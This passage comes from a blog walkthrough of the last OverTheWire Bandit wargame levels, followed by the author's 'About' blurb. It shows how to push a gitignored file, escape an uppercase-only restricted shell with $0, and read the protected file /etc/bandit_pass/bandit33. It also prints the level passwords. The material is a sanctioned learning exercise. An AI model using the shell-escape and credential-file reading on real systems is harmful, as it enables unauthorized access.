bandit31@bandit:/tmp/gitfolder5$ cd repo/ bandit31@bandit:/tmp/gitfolder5/repo$ ls -la total 20 drwxr-sr-x 3 bandit31 root 4096 Jul 6 19:37 . drwxr-sr-x 3 bandit31 root 4096 Jul 6 19:37 .. drwxr-sr-x 8 bandit31 root 4096 Jul 6 19:37 .git -rw-r--r-- 1 bandit31 root 6 Jul 6 19:37 .gitignore -rw-r--r-- 1 bandit31 root 147 Jul 6 19:37 README.md bandit31@bandit:/tmp/gitfolder5/repo$ cat README.md This time your task is to push a file to the remote repository. Details: File name: key.txt Content: 'May I come in?' Branch: master So the README.md mentions a key.txt file, and that we should push a file to the repo. Let’s do it then. bandit31@bandit:/tmp/gitfolder5/repo$ vi key.txt bandit31@bandit:/tmp/gitfolder5/repo$ git add . bandit31@bandit:/tmp/gitfolder5/repo$ git commit -a On branch master Your branch is up-to-date with 'origin/master'. nothing to commit, working tree clean Well we couldn’t push since it says we are up to date. Maybe it’s the gitignore. Let’s see it. bandit31@bandit:/tmp/gitfolder5/repo$ cat .gitignore *.txt So as i suspected git is ignoring all the files with the txt extension, so key.txt would be ignored. We can for the file to be added anyways by using the -f flag. bandit31@bandit:/tmp/gitfolder5/repo$ git add key.txt -f bandit31@bandit:/tmp/gitfolder5/repo$ git commit -a Unable to create directory /home/bandit31/.nano: Permission denied It is required for saving/loading search history or cursor positions. Press Enter to continue [master e67c6e5] Added key.txt file 1 file changed, 1 insertion(+) create mode 100644 key.txt Now we only need to push the file. bandit31@bandit:/tmp/gitfolder5/repo$ git push Could not create directory '/home/bandit31/.ssh'. The authenticity of host 'localhost (127.0.0.1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yes Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit31-git@localhost's password: Counting objects: 3, done. Delta compression using up to 4 threads. Compressing objects: 100% (2/2), done. Writing objects: 100% (3/3), 326 bytes | 0 bytes/s, done. Total 3 (delta 0), reused 0 (delta 0) remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done! Here is the password for the next level: remote: 56a9bf19c63d650ce78e6ec0354ee45e remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.o","date":"06-07-2019","objectID":"/bandit/:33:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 33 After all this git stuff its time for another escape. Good luck! Enough of git then. Now we have to escape. WELCOME TO THE UPPERCASE SHELL \u003e\u003e So now we are stuck inside of a uppercase shell. Any command that we run is ran in upper case. \u003e\u003e ls sh: 1: LS: not found \u003e\u003e \"ls\" sh: 1: LS: not found Not even as a string. Well i had to google this one because this wasn’t really that easy. So it happens that the $0 variable runs a shell, so that should be enough. \u003e\u003e $0 $ We got a shell. Now it should be easy to just see the file content. $ ls -la total 28 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile -rwsr-x--- 1 bandit33 bandit32 7556 Oct 16 2018 uppershell $ cat /etc/bandit_pass/bandit33 c9c3199ddf4121b10cf581a98d51caee Done! Next one! ","date":"06-07-2019","objectID":"/bandit/:34:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["Posts"],"content":"Level 34 bandit33@bandit:~$ ls -la total 24 drwxr-xr-x 2 root root 4096 Oct 16 2018 . drwxr-xr-x 41 root root 4096 Oct 16 2018 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile -rw------- 1 bandit33 bandit33 430 Oct 16 2018 README.txt bandit33@bandit:~$ cat README.txt Congratulations on solving the last level of this game! At this moment, there are no more levels to play in this game. However, we are constantly working on new levels and will most likely expand this game with more levels soon. Keep an eye out for an announcement on our usual communication channels! In the meantime, you could play some of our other wargames. If you have an idea for an awesome new level, please let us know! We did it! We finished all the levels! At the moment (July 6th, 2019) there are no more challenges. So bye bye and thanks for checking out this walkthrough. ","date":"06-07-2019","objectID":"/bandit/:35:0","tags":["beginner","linux","ssh"],"title":"Over The Wire - Bandit Walkthrough","uri":"/bandit/"},{"categories":["About"],"content":"My name is Bruno Anjos I’m 24 and I’m a Computer Science student currently in my masters’ degree final year at FCT-NOVA. I’m mostly interested in Systems Engineering, Distributed Systems, Networks and Security. I’m a member of the Root Lee CTF team. As my non professional interests here goes a list: battle rap, videogames, comedy, music. Feel free to hit me up at any of the contact icons in the main page. ","date":"28-06-2019","objectID":"/about/:0:0","tags":[],"title":"About Me","uri":"/about/"}]